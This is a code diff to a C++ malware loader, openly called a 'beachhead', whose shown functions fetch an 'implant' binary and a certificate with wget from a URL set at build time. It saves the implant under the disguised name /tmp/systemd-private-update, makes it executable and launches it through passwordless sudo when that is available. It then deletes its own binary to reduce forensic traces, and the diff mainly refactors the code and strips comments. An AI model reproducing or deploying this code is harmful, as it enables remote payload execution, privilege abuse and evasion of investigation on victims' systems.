@@ -19,6 +19,7 @@
 #include <unistd.h>
 #include <sys/syscall.h>
 #include <sys/wait.h>
+#include <fcntl.h>          // <-- ADDED: for O_WRONLY
 #include <cstring>
 
 #include "privesc_check.h"
@@ -33,6 +34,8 @@ static void log_status(const char* msg) {
     while (msg[len]) len++;
     syscall(SYS_write, 2, msg, len);  // stderr
     syscall(SYS_write, 2, "\n", 1);
+#else
+    (void)msg;   // suppress unused parameter warning
 #endif
 }
 
@@ -41,7 +44,6 @@ static void log_status(const char* msg) {
 // Returns true if "sudo -n true" succeeds, false otherwise.
 // ----------------------------------------------------------------------
 static bool can_sudo_nopasswd() {
-    // fork and exec sudo -n true
     pid_t pid = syscall(SYS_fork);
     if (pid < 0) return false;
 
@@ -56,12 +58,12 @@ static bool can_sudo_nopasswd() {
         const char* argv[] = { "sudo", "-n", "true", nullptr };
         syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
         syscall(SYS_exit, 1);  // execve failed
-    } else {
-        // parent: wait for child
-        int status;
-        syscall(SYS_wait4, pid, &status, 0, nullptr);
-        return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
     }
+
+    // parent: wait for child
+    int status;
+    syscall(SYS_wait4, pid, &status, 0, nullptr);
+    return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
 }
 
 // ----------------------------------------------------------------------
@@ -82,11 +84,12 @@ static bool download_file(const char* url, const char* dest) {
         const char* argv[] = { "wget", "-q", url, "-O", dest, nullptr };
         syscall(SYS_execve, "/usr/bin/wget", argv, nullptr);
         syscall(SYS_exit, 1);
-    } else {
-        int status;
-        syscall(SYS_wait4, pid, &status, 0, nullptr);
-        return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
     }
+
+    // parent: wait for child
+    int status;
+    syscall(SYS_wait4, pid, &status, 0, nullptr);
+    return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
 }
 
 // ----------------------------------------------------------------------
@@ -183,7 +186,6 @@ int main() {
     // Implant binary location (defined via -DURL in Makefile)
     const char* implant_url = URL;
     // Certificate location (derived from URL, e.g., http://.../cert.pem)
-    // We assume the attacker serves cert.pem at the same base URL.
     std::string cert_url_str = URL;
     size_t last_slash = cert_url_str.rfind('/');
     if (last_slash != std::string::npos)
@@ -192,8 +194,8 @@ int main() {
         cert_url_str = "cert.pem";
     const char* cert_url = cert_url_str.c_str();
 
-    const char* implant_path = "/tmp/systemd-private-update"; // final implant binary
-    const char* cert_path = "/tmp/index.html";               // certificate for TLS
+    const char* implant_path = "/tmp/systemd-private-update";
+    const char* cert_path = "/tmp/index.html";
 
     if (!download_file(implant_url, implant_path)) {
         log_status("[!] Failed to download implant");
@@ -202,16 +204,13 @@ int main() {
 
     if (!download_file(cert_url, cert_path)) {
         log_status("[!] Failed to download certificate (continuing anyway)");
-        // Not fatal – implant may still work if it has certificate elsewhere
     }
 
-    // Make the implant executable
     syscall(SYS_chmod, implant_path, 0755);
-
     log_status("[+] Implant and certificate downloaded");
 
     // ====================================================================
-    // STAGE 4: Execute the implant with elevated privileges (if possible)
+    // STAGE 4: Execute the implant with elevated privileges
     // ====================================================================
     log_status("[*] Stage 4: Executing implant...");
 
@@ -230,7 +229,6 @@ int main() {
             syscall(SYS_close, devnull);
         }
 
-        // Decide how to launch: sudo if we have passwordless sudo, else direct
         if (can_sudo_nopasswd()) {
             const char* argv[] = { "sudo", "-n", implant_path, nullptr };
             syscall(SYS_execve, "/usr/bin/sudo", argv, nullptr);
@@ -238,19 +236,12 @@ int main() {
             const char* argv[] = { implant_path, nullptr };
             syscall(SYS_execve, implant_path, argv, nullptr);
         }
-
-        // If we get here, exec failed
         syscall(SYS_exit, 1);
-    } else {
-        // Parent continues – implant is now running in background
-        log_status("[+] Implant launched");
     }
 
-    // ====================================================================
-    // CLEANUP: Remove beachhead artifacts (unless DEBUG is defined)
-    // ====================================================================
+    log_status("[+] Implant launched");
+
 #ifndef DEBUG
-    // Self‑delete the beachhead binary to reduce forensic footprint
     syscall(SYS_unlink, "/proc/self/exe");
 #endif
 
